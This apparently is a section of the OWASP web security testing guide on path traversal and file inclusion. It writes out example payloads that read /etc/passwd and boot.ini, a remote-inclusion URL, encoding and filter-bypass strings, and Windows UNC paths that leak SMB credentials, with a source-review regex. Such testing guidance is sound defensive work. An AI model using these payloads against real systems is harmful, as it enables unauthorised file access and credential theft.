# Black-Box Testing

## Input Vectors Enumeration

In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.

Here are some examples of the checks to be performed at this stage:

- Are there request parameters which could be used for file-related operations?
- Are there unusual file extensions?
- Are there interesting variable names?
    - `http://example.com/getUserProfile.jsp?item=ikki.html`
    - `http://example.com/index.php?file=content`
    - `http://example.com/main.cgi?home=index.htm`
- Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?
    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

## Testing Techniques

The next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called `getUserProfile.jsp` loads static information from a file and shows the content to users. An attacker could insert the malicious string `../../../../etc/passwd` to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.

**Note:** To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.

```text
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```

Another common example is including content from an external source:

```text
http://example.com/index.php?file=http://www.owasp.org/malicioustxt
```

The same can be applied to cookies or any other input vector that is used for dynamic page generation.

More file inclusion payloads can be found at [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

It is important to note that different operating systems use different path separators

- Unix-like OS:
    - root directory: `/`
    - directory separator: `/`
- Windows OS:
    - root directory: `<drive letter>:`
    - directory separator: `\` or `/`
- Classic macOS:
    - root directory: `<drive letter>:`
    - directory separator: `:`

It's a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn't successful, try another encoding scheme.

You can find encoding techniques and ready to use directory traversal payloads at [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

## Windows Specific Considerations

- Windows shell: Appending any of the following to paths used in a shell command results in no difference in function:
    - Angle brackets `<` and `>` at the end of the path
    - Double quotes (closed properly) at the end of the path
    - Extraneous current directory markers such as `./` or `.\\`
    - Extraneous parent directory markers with arbitrary items that may or may not exist:
        - `file.txt`
        - `file.txt...`
        - `file.txt<spaces>`
        - `file.txt""""`
        - `file.txt<<<>>><`
        - `./././file.txt`
        - `nonexistant/../file.txt`
- Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename:
    - periods
    - spaces
- Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.
    - `\\server_or_ip\path\to\file.abc`
    - `\\?\server_or_ip\path\to\file.abc`
- Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path.
    - May be equivalent to a drive letter such as `c:\`, or even a drive volume without an assigned letter: `\\.\GLOBALROOT\Device\HarddiskVolume1\`
    - Refers to the first disc drive on the machine: `\\.\CdRom0\`

# Gray-Box Testing

When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the *grep* command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.

- `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
- `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
- `ASP: include file, include virtual, ...`

Using online code search engines (e.g., [Searchcode](https://searchcode.com/)), it may also be possible to find path traversal flaws in Open Source software published on the internet.

For PHP, testers can use the following regex:

```text
(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

Using the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.

Some web applications generate dynamic pages using values and parameters stored in a database. It may be possible to insert specially crafted path traversal strings when the application adds data to the database. This kind of security problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and **safe** but are not in reality.

Additionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are usually prone to security flaws.

Consider a web application with these instructions:

```php
filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");
```

Testing for the flaw is achieved by:

```text
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```

